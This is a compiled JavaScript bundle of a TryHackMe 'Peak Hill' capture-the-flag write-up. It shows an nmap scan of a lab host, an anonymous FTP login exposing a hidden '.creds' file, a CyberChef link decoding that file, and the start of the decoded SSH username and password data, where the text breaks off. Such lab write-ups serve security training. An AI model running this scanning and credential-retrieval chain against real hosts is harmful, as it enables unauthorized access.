"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8734],{3905:(M,w,A)=>{A.d(w,{Zo:()=>s,kt:()=>i});var D=A(67294);function x(M,w,A){return w in M?Object.defineProperty(M,w,{value:A,enumerable:!0,configurable:!0,writable:!0}):M[w]=A,M}function e(M,w){var A=Object.keys(M);if(Object.getOwnPropertySymbols){var D=Object.getOwnPropertySymbols(M);w&&(D=D.filter((function(w){return Object.getOwnPropertyDescriptor(M,w).enumerable}))),A.push.apply(A,D)}return A}function T(M){for(var w=1;w<arguments.length;w++){var A=null!=arguments[w]?arguments[w]:{};w%2?e(Object(A),!0).forEach((function(w){x(M,w,A[w])})):Object.getOwnPropertyDescriptors?Object.defineProperties(M,Object.getOwnPropertyDescriptors(A)):e(Object(A)).forEach((function(w){Object.defineProperty(M,w,Object.getOwnPropertyDescriptor(A,w))}))}return M}function E(M,w){if(null==M)return{};var A,D,x=function(M,w){if(null==M)return{};var A,D,x={},e=Object.keys(M);for(D=0;D<e.length;D++)A=e[D],w.indexOf(A)>=0||(x[A]=M[A]);return x}(M,w);if(Object.getOwnPropertySymbols){var e=Object.getOwnPropertySymbols(M);for(D=0;D<e.length;D++)A=e[D],w.indexOf(A)>=0||Object.prototype.propertyIsEnumerable.call(M,A)&&(x[A]=M[A])}return x}var n=D.createContext({}),r=function(M){var w=D.useContext(n),A=w;return M&&(A="function"==typeof M?M(w):T(T({},w),M)),A},s=function(M){var w=r(M.components);return D.createElement(n.Provider,{value:w},M.children)},t="mdxType",a={inlineCode:"code",wrapper:function(M){var w=M.children;return D.createElement(D.Fragment,{},w)}},o=D.forwardRef((function(M,w){var A=M.components,x=M.mdxType,e=M.originalType,n=M.parentName,s=E(M,["components","mdxType","originalType","parentName"]),t=r(A),o=x,i=t["".concat(n,".").concat(o)]||t[o]||a[o]||e;return A?D.createElement(i,T(T({ref:w},s),{},{components:A})):D.createElement(i,T({ref:w},s))}));function i(M,w){var A=arguments,x=w&&w.mdxType;if("string"==typeof M||x){var e=A.length,T=new Array(e);T[0]=o;var E={};for(var n in w)hasOwnProperty.call(w,n)&&(E[n]=w[n]);E.originalType=M,E[t]="string"==typeof M?M:x,T[1]=E;for(var r=2;r<e;r++)T[r]=A[r];return D.createElement.apply(null,T)}return D.createElement.apply(null,A)}o.displayName="MDXCreateElement"},77516:(M,w,A)=>{A.r(w),A.d(w,{assets:()=>n,contentTitle:()=>T,default:()=>a,frontMatter:()=>e,metadata:()=>E,toc:()=>r});var D=A(87462),x=(A(67294),A(3905));const e={},T="Peak Hill",E={unversionedId:"Tryhackme/Peak Hill/Peak Hill",id:"Tryhackme/Peak Hill/Peak Hill",title:"Peak Hill",description:"Exercises in Python library abuse and some exploitation techniques",source:"@site/writeups/Tryhackme/Peak Hill/Peak Hill.md",sourceDirName:"Tryhackme/Peak Hill",slug:"/Tryhackme/Peak Hill/",permalink:"/writeups/Tryhackme/Peak Hill/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"PS Empire",permalink:"/writeups/Tryhackme/PS Empire/"},next:{title:"Persistence",permalink:"/writeups/Tryhackme/Persistence/"}},n={},r=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Peak Hill",id:"task-1-peak-hill",level:2}],s={toc:r},t="wrapper";function a(M){let{components:w,...A}=M;return(0,x.kt)(t,(0,D.Z)({},s,A,{components:w,mdxType:"MDXLayout"}),(0,x.kt)("h1",{id:"peak-hill"},"Peak Hill"),(0,x.kt)("p",null,"Exercises in Python library abuse and some exploitation techniques"),(0,x.kt)("p",null,(0,x.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/peakhill"},"Peak Hill")),(0,x.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,x.kt)("ul",null,(0,x.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,x.kt)("li",{parentName:"ul"},"FTP Enumeration"),(0,x.kt)("li",{parentName:"ul"},"Cryptography",(0,x.kt)("ul",{parentName:"li"},(0,x.kt)("li",{parentName:"ul"},"Binary"))),(0,x.kt)("li",{parentName:"ul"},"Python Scripting (Decoder)"),(0,x.kt)("li",{parentName:"ul"},"Reverse Enginierung"),(0,x.kt)("li",{parentName:"ul"},"Misconfigured Binaries")),(0,x.kt)("hr",null),(0,x.kt)("h2",{id:"task-1-peak-hill"},"Task 1 Peak Hill"),(0,x.kt)("p",null,"Deploy and compromise the machine!\nMake sure you're connected to TryHackMe's network."),(0,x.kt)("pre",null,(0,x.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Peak Hill$ sudo nmap -p- -Pn -sS -sC -sV -O 10.10.13.125\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 17:02 CEST\nNmap scan report for 10.10.13.125\nHost is up (0.040s latency).\nNot shown: 65531 filtered ports\nPORT     STATE  SERVICE  VERSION\n20/tcp   closed ftp-data\n21/tcp   open   ftp      vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 ftp      ftp            17 May 15 18:37 test.txt\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:10.8.106.222\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 3\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp   open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 04:d5:75:9d:c1:40:51:37:73:4c:42:30:38:b8:d6:df (RSA)\n|   256 7f:95:1a:d7:59:2f:19:06:ea:c1:55:ec:58:35:0c:05 (ECDSA)\n|_  256 a5:15:36:92:1c:aa:59:9b:8a:d8:ea:13:c9:c0:ff:b6 (ED25519)\n7321/tcp open   swx?\n| fingerprint-strings:\n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:\n|     Username: Password:\n|   NULL:\n|_    Username:\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port7321-TCP:V=7.80%I=7%D=10/8%Time=5F7F2AE0%P=x86_64-pc-linux-gnu%r(NU\nSF:LL,A,"Username:\\x20")%r(GenericLines,14,"Username:\\x20Password:\\x20")%r\nSF:(GetRequest,14,"Username:\\x20Password:\\x20")%r(HTTPOptions,14,"Username\nSF::\\x20Password:\\x20")%r(RTSPRequest,14,"Username:\\x20Password:\\x20")%r(R\nSF:PCCheck,14,"Username:\\x20Password:\\x20")%r(DNSVersionBindReqTCP,14,"Use\nSF:rname:\\x20Password:\\x20")%r(DNSStatusRequestTCP,14,"Username:\\x20Passwo\nSF:rd:\\x20")%r(Help,14,"Username:\\x20Password:\\x20")%r(SSLSessionReq,14,"U\nSF:sername:\\x20Password:\\x20")%r(TerminalServerCookie,14,"Username:\\x20Pas\nSF:sword:\\x20")%r(TLSSessionReq,14,"Username:\\x20Password:\\x20")%r(Kerbero\nSF:s,14,"Username:\\x20Password:\\x20")%r(SMBProgNeg,14,"Username:\\x20Passwo\nSF:rd:\\x20")%r(X11Probe,14,"Username:\\x20Password:\\x20")%r(FourOhFourReque\nSF:st,14,"Username:\\x20Password:\\x20")%r(LPDString,14,"Username:\\x20Passwo\nSF:rd:\\x20")%r(LDAPSearchReq,14,"Username:\\x20Password:\\x20")%r(LDAPBindRe\nSF:q,14,"Username:\\x20Password:\\x20")%r(SIPOptions,14,"Username:\\x20Passwo\nSF:rd:\\x20")%r(LANDesk-RC,14,"Username:\\x20Password:\\x20")%r(TerminalServe\nSF:r,14,"Username:\\x20Password:\\x20")%r(NCP,14,"Username:\\x20Password:\\x20\nSF:")%r(NotesRPC,14,"Username:\\x20Password:\\x20")%r(JavaRMI,14,"Username:\\\nSF:x20Password:\\x20")%r(WMSRequest,14,"Username:\\x20Password:\\x20")%r(orac\nSF:le-tns,14,"Username:\\x20Password:\\x20")%r(ms-sql-s,14,"Username:\\x20Pas\nSF:sword:\\x20")%r(afp,14,"Username:\\x20Password:\\x20")%r(giop,14,"Username\nSF::\\x20Password:\\x20");\nDevice type: general purpose|specialized|storage-misc|WAP|printer\nRunning (JUST GUESSING): Linux 3.X|4.X|2.6.X|2.4.X (91%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4 cpe:/o:linux:linux_kernel:2.4\nAggressive OS guesses: Linux 3.10 - 3.13 (91%), Linux 3.10 - 4.11 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Crestron XPanel control system (89%), Linux 3.12 (89%), Linux 3.2 - 3.5 (89%)\nNo exact OS matches for host (test conditions non-ideal).\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 353.06 seconds\n')),(0,x.kt)("pre",null,(0,x.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Peak Hill$ ftp 10.10.13.125\nConnected to 10.10.13.125.\n220 (vsFTPd 3.0.3)\nName (10.10.13.125:kali): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 ftp      ftp          4096 May 15 18:37 .\ndrwxr-xr-x    2 ftp      ftp          4096 May 15 18:37 ..\n-rw-r--r--    1 ftp      ftp          7048 May 15 18:37 .creds\n-rw-r--r--    1 ftp      ftp            17 May 15 18:37 test.txt\n226 Directory send OK.\nftp>\n")),(0,x.kt)("ul",null,(0,x.kt)("li",{parentName:"ul"},(0,x.kt)("a",{parentName:"li",href:"https://gchq.github.io/CyberChef/#recipe=From_Binary('Space')&input=MTAwMDAwMDAwMDAwMDAxMTAxMDExMTAxMDExMTAwMDEwMDAwMDAwMDAwMTAxMDAwMDEwMTEwMDAwMDAwMTAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDAwMTAwMTEwMTAxMDExMTAwMDEwMDAwMDAwMTAxMDExMDAwMDAwMDAwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDEwMTAxMTEwMDAxMDAwMDAwMTAxMDAwMDExMDAxMTEwMDAxMDAwMDAwMTEwMTAxMTAwMDAwMDAxMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDEwMTAxMTEwMDExMDExMDAxMDEwMTExMDAxMDAwMTEwMDAxMDExMTAwMDEwMDAwMDEwMDAxMDExMDAwMDAwMDAwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTEwMTAwMDAxMTEwMDAxMDAwMDAxMDExMDAwMDExMDAxMTEwMDAxMDAwMDAxMTAwMTAxMTAwMDAwMDAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMDEwMDAxMTAxMDEwMTExMDAwMTAwMDAwMTExMDEwMTEwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDEwMDExMTAwMDEwMDAwMTAwMDEwMDAwMTEwMDExMTAwMDEwMDAwMTAwMTAxMDExMDAwMDAwMDEwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMTAwMDExMDAwMDAxMTEwMDAxMDAwMDEwMTAwMTEwMTAwMDAwMDAwMTAxMTAwMDAxMTAwMTExMDAwMTAwMDAxMDExMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDExMTAxMTEwMDAxMDAwMDExMDAwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDEwMTExMTEwMTExMDAwMTAwMDAxMTAxMTAwMDAxMTAwMTExMDAwMTAwMDAxMTEwMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAxMDEwMTExMDAxMTAxMTAwMTAxMDExMTAwMTAwMDExMDAwMDAxMTEwMDAxMDAwMDExMTEwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMDAxMTEwMTExMDAwMTAwMDEwMDAwMTAwMDAxMTAwMTExMDAwMTAwMDEwMDAxMDEwMTEwMDAwMDAwMTAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDAxMDAwMTEwMTEwMDExMTAwMDEwMDAxMDAxMDAxMDExMDAwMDAwMDAwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTEwMTEwMDAxMTEwMDAxMDAwMTAwMTExMDAwMDExMDAxMTEwMDAxMDAwMTAxMDAwMTAxMTAwMDAwMDAxMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMTAxMDExMTAwMDEwMDAxMDEwMTAxMDExMDAwMDAwMDAwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMDAxMTAxMTEwMDAxMDAwMTAxMTAxMDAwMDExMDAxMTEwMDAxMDAwMTAxMTEwMTAxMTAwMDAwMDAxMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMDAxMDExMTAwMDEwMDAxMTAwMDAxMDExMDAwMDAwMDAwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMDAwMTAxMTEwMDAxMDAwMTEwMDExMDAwMDExMDAxMTEwMDAxMDAwMTEwMTAwMTAxMTAwMDAwMDAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMDEwMDAxMTAwMTAwMTExMDAwMTAwMDExMDExMDExMDEwMDAwMDAwMTEwMTEwMDAwMTEwMDExMTAwMDEwMDAxMTEwMDAxMDExMDAwMDAwMDEwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMDEwMDExMDAxMDAxMTEwMDAxMDAwMTExMDEwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDEwMDAwMDAwMTExMDAwMTAwMDExMTEwMTAwMDAxMTAwMTExMDAwMTAwMDExMTExMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAxMDEwMTExMDAxMTAxMTAwMTAxMDExMTAwMTAwMDExMDAxMDAxMTEwMDAxMDAxMDAwMDAwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMDAxMDEwMTExMDAwMTAwMTAwMDAxMTAwMDAxMTAwMTExMDAwMTAwMTAwMDEwMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAxMDEwMTExMDAxMTAxMTAwMTAxMDExMTAwMTAwMDExMDEwMTAxMTEwMDAxMDAxMDAwMTEwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMDEwMDEwMTExMDAwMTAwMTAwMTAwMTAwMDAxMTAwMTExMDAwMTAwMTAwMTAxMDEwMTEwMDAwMDAwMTAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDAwMTAwMTExMDAwMDExMTAwMDEwMDEwMDExMDAxMTAxMDAwMDAwMDExMDExMDAwMDExMDAxMTEwMDAxMDAxMDAxMTEwMTAxMTAwMDAwMDAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMDEwMDAxMTAxMTEwMTExMDAwMTAwMTAxMDAwMDEwMTEwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTAwMTAwMDExMTAwMDEwMDEwMTAwMTEwMDAwMTEwMDExMTAwMDEwMDEwMTAxMDAxMDExMDAwMDAwMDEwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMTEwMTExMDAwMTAwMTAxMDExMDEwMTEwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTAxMDExMDExMTAwMDEwMDEwMTEwMDEwMDAwMTEwMDExMTAwMDEwMDEwMTEwMTAxMDExMDAwMDAwMDEwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMDEwMDExMTAwMTAxMTEwMDAxMDAxMDExMTAwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAxMDAwMTExMDAwMTAwMTAxMTExMTAwMDAxMTAwMTExMDAwMTAwMTEwMDAwMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDExMDAxMTEwMDAxMDAxMTAwMDEwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAwMTAwMTEwMDEwMTAwMDAxMTAwMTExMDAwMTAwMTEwMDExMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMTAwMTAxMTEwMDAxMDAxMTAxMDAwMTEwMTAwMDAwMDExMDAxMTAwMDAxMTAwMTExMDAwMTAwMTEwMTAxMDEwMTEwMDAwMDAwMTAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDAxMDAwMTEwMDExMDExMTAwMDEwMDExMDExMDAxMDExMDAwMDAwMDAwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDExMTAxMTEwMDAxMDAxMTAxMTExMDAwMDExMDAxMTEwMDAxMDAxMTEwMDAwMTAxMTAwMDAwMDAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMDEwMDAxMTAwMDEwMTExMDAwMTAwMTExMDAxMDExMDEwMDAwMDAxMDExMDEwMDAwMTEwMDExMTAwMDEwMDExMTAxMDAxMDExMDAwMDAwMDEwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAxMDAwMTExMDAwMTAwMTExMDExMDExMDEwMDAwMDAxMDAxMTEwMDAwMTEwMDExMTAwMDEwMDExMTEwMDAxMDExMDAwMDAwMDEwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMDEwMDExMDEwMDAxMTEwMDAxMDAxMTExMDEwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTAwMDAwMTExMDAwMTAwMTExMTEwMTAwMDAxMTAwMTExMDAwMTAwMTExMTExMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAxMDEwMTExMDAxMTAxMTAwMTAxMDExMTAwMTAwMDExMDExMDAxMTEwMDAxMDEwMDAwMDAwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMDExMTAwMTExMDAwMTAxMDAwMDAxMTAwMDAxMTAwMTExMDAwMTAxMDAwMDEwMDEwMTEwMDAwMDAwMTAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDAxMDAxMTEwMDAxMDEwMDAwMTEwMTAxMTAwMDAwMDAwMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMDAwMTEwMTExMDAwMTAxMDAwMTAwMTAwMDAxMTAwMTExMDAwMTAxMDAwMTAxMDEwMTEwMDAwMDAwMTAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDAwMTAwMTEwMDExMDExMTAwMDEwMTAwMDExMDAxMTAxMDAwMDAwMDEwMDAxMDAwMDExMDAxMTEwMDAxMDEwMDAxMTEwMTAxMTAwMDAwMDAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMDAxMDAxMTAxMTAwMTExMDAwMTAxMDAxMDAwMDExMDEwMDAwMTAwMDAwMTEwMDAwMTEwMDExMTAwMDEwMTAwMTAwMTAxMDExMDAwMDAwMDEwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTEwMDAwMTExMDAwMTAxMDAxMDEwMDExMDEwMDAwMDAxMTExMDEwMDAwMTEwMDExMTAwMDEwMTAwMTAxMTAxMDExMDAwMDAwMDEwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMDEwMDExMDExMTAxMTEwMDAxMDEwMDExMDAwMTEwMTAwMDAwMTAxMDAxMTAwMDAxMTAwMTExMDAwMTAxMDAxMTAxMDEwMTEwMDAwMDAwMTAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDExMDExMTAwMTEwMTEwMTAwMDAxMDExMTExMDExMTAwMDAwMTEwMDAwMTAxMTEwMDExMDExMTAwMTEwMDExMDAxMDAwMTEwMTAwMDExMTAwMDEwMTAwMTExMDAxMTAxMDAwMDAxMTExMTAxMDAwMDExMDAxMTEwMDAxMDEwMDExMTEwMTAxMTAwMDAwMDAxMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDEwMTAxMTEwMDExMDExMDAxMDEwMTExMDAxMDAwMTEwMDExMDExMTAwMDEwMTAxMDAwMDAxMTAxMDAwMDAwMDEwMDAxMDAwMDExMDAxMTEwMDAxMDEwMTAwMDEwMTAxMTAwMDAwMDAxMDAxMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDEwMTAxMTEwMDExMDExMDAxMDEwMTExMDAxMDAwMTEwMTAwMDExMTAwMDEwMTAxMDAxMDAxMTAxMDAwMDAxMDExMDAxMDAwMDExMDAxMTEwMDAxMDEwMTAwMTEwMTAxMTAwMDAwMDAxMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDExMTAwMTEwMTExMDAxMTAxMTAxMDAwMDEwMTExMTEwMTExMDAwMDAxMTAwMDAxMDExMTAwMTEwMTExMDAxMTAwMTEwMDAxMDAxMTAwMDEwMTExMDAwMTAxMDEwMTAwMDExMDEwMDAwMDAwMTEwMTEwMDAwMTEwMDExMTAwMDEwMTAxMDEwMTAxMDExMDAwMDAwMDEwMDEwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMDAwMTExMDAwMTAxMDEwMTEwMDEwMTEwMDAwMDAwMDAwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAxMTEwMDAwMDExMTAwMDEwMTAxMDExMTEwMDAwMTEwMDExMTAwMDEwMTAxMTAwMDAxMDExMDAwMDAwMDEwMTAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMTExMDAxMTAxMTEwMDExMDExMDEwMDAwMTAxMTExMTAxMTEwMDAwMDExMDAwMDEwMTExMDAxMTAxMTEwMDExMDAxMTAwMDEwMDExMDAwMDAxMTEwMDAxMDEwMTEwMDEwMTEwMTAwMDAwMDExMDAxMTAwMDAxMTAwMTExMDAwMTAxMDExMDEwMDExMDAxMDEwMDEwMTExMA"}))),(0,x.kt)("pre",null,(0,x.kt)("code",{parentName:"pre"},"..]q.(X\n...ssh_pass15q.X....uq..q.X ...ssh_user1q.X....hq..q.X\n...ssh_pass25q.X....rq..q   X\n...ssh_pass20q\nh..q.X  ...ssh_pass7q.X...._q\n.q.X    ...ssh_user0q.X....gq..q.X\n...ssh_pass26q.X....lq..q.X ...ssh_pass5q.X....3q..q.X  ...ssh_pass1q.X....1q..q.X\n...ssh_pass22q.h\n.q.X\n...ssh_pass12q.X....@q..q.X ...ssh_user2q X....eq!.q\"X  ...ssh_user5q#X....iq$.q%X\n...ssh_pass18q&h\n.q'X\n...ssh_pass27q(X....dq).q*X ...ssh_pass3q+X....kq,.q-X\n...ssh_pass19q.X....tq/.q0X ...ssh_pass6q1X....sq2.q3X  ...ssh_pass9q4h..q5X\n...ssh_pass23q6X....wq7.q8X\n...ssh_pass21q9h..q:X   ...ssh_pass4q;h..q<X\n...ssh_pass14q=X....0q>.q?X ...ssh_user6q@X....nqA.qBX  ...ssh_pass2qCX....cqD.qEX\n...ssh_pass13qFh..qGX\n...ssh_pass16qHhA.qIX   